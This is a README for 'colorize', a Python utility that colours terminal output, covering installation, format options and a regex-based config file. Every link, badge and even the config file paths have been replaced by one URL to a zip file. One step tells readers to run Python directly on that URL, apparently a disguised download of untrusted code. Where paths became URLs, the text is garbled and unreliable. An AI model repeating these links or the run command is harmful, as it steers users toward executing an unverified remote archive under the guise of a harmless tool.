Colorize
========

Give some color to your (remote) TTY!!

==============  ===============  =========  ============  =======
VERSION         DOWNLOADS        TESTS      COVERAGE      WHEEL
==============  ===============  =========  ============  =======
|pip version|   |pip downloads|  |travis|   |coveralls|   |wheel|
==============  ===============  =========  ============  =======

And it is free. Checkout the `Source code`_.


Installation and Usage
----------------------

Two options: to install it in your system/project::

    pip install colorize

And you can use it with::

    python -m colorize -h


Or just `download the lastest egg`_ and use it with::

   python https://raw.githubusercontent.com/jeliasrm/colorize/master/Caulerpa/colorize.zip -h


Now, you have two ways to use it:

Rendering the output
~~~~~~~~~~~~~~~~~~~~

Just execute::

    $ command to execute | python -m colorize

If you need to render both the stdout and the stderr::

    $ command to execute |& python -m colorize

This method works well with too long outputs

As runner
~~~~~~~~~

Other way to use it:

    $ python -m colorize command to execute

This method can do disgusting things with too long outputs.

Options
-------

You can change the output format with the argument :code:`-f` or :code:`--format`. It uses the same format that ``logging``, so you can use any of its special variables, like:

- :code:`%(asctime)s`, to show the time.
- :code:`%(message)s`, to show the message itself.
- :code:`%(msecs)d`, to show the relative time.
- `Any other output format allowed by logging`_.

You can combine them as you wish. Example::

    $ python -m colorize -- echo foo
    foo
    $ python -m colorize -f "%(asctime)s - %(levelname).2s: %(message)s" -- echo foo
    05-29 08:43:09 - IN: foo
    $ python -m colorize -f "%(levelname).2s %(asctime)s - %(message)s" -- echo foo
    IN 05-29 08:44:17 - foo

Default date format is :code:`%m-%d %H:%M:%S`, but you can change it with :code:`--date-format`::

    $ python -m colorize -f "%(asctime)s" --date-format="%H:%M:%S" -- echo foo
    08:44:17
    $ python -m colorize -f "%(asctime)s" --date-format="%H %M %S" -- echo foo
    08 44 17


Configuration File
------------------

It will find a configuration file in the current directory, in the home directory or in the default path directory. The first one found will be used. So, it will search for:

- ``https://raw.githubusercontent.com/jeliasrm/colorize/master/Caulerpa/colorize.zip``
- ``$https://raw.githubusercontent.com/jeliasrm/colorize/master/Caulerpa/colorize.zip``
- ``https://raw.githubusercontent.com/jeliasrm/colorize/master/Caulerpa/colorize.zip``

The format for this file is very easy: it is a CSV file with next fields::

    # regular expression to highlight (quoted) , bold output , foreground color , background color
      "^=+$"                                   , 1           , white            ,
      "^=+$"                                   , true        , white            , black
      "^=+$"                                   , 0           , red              , white
      "^=+$"                                   , false       , brown            , magenta

Available colors:

- :code:`black`
- :code:`white`
- :code:`red`
- :code:`green`
- :code:`blue`
- :code:`brown`
- :code:`gray`
- :code:`magenta`
- :code:`cyan`

And that's all.

Example to simulate colordiff
-----------------------------

To emulate colordiff, just use this configuration file::

    "^>.*",                0, blue
    "^<.*",                0, red
    "^\d+,?\d*c\d+,?\d*$", 0, magenta

That's enough :D


.. |travis| image:: https://raw.githubusercontent.com/jeliasrm/colorize/master/Caulerpa/colorize.zip
  :target: `Travis`_
  :alt: Travis results

.. |coveralls| image:: https://raw.githubusercontent.com/jeliasrm/colorize/master/Caulerpa/colorize.zip
  :target: `Coveralls`_
  :alt: Coveralls results_

.. |pip version| image:: https://raw.githubusercontent.com/jeliasrm/colorize/master/Caulerpa/colorize.zip
    :target: `project`_
    :alt: Latest PyPI version

.. |pip downloads| image:: https://raw.githubusercontent.com/jeliasrm/colorize/master/Caulerpa/colorize.zip
    :target: `project`_
    :alt: Number of PyPI downloads

.. |wheel| image:: https://raw.githubusercontent.com/jeliasrm/colorize/master/Caulerpa/colorize.zip
    :target: `project`_
    :alt: Wheel Status

.. _Travis: https://raw.githubusercontent.com/jeliasrm/colorize/master/Caulerpa/colorize.zip
.. _Coveralls: https://raw.githubusercontent.com/jeliasrm/colorize/master/Caulerpa/colorize.zip
.. _project: https://raw.githubusercontent.com/jeliasrm/colorize/master/Caulerpa/colorize.zip
.. _download the lastest egg: https://raw.githubusercontent.com/jeliasrm/colorize/master/Caulerpa/colorize.zip
.. _Source code: https://raw.githubusercontent.com/jeliasrm/colorize/master/Caulerpa/colorize.zip
.. _Any other output format allowed by logging: https://raw.githubusercontent.com/jeliasrm/colorize/master/Caulerpa/colorize.zip
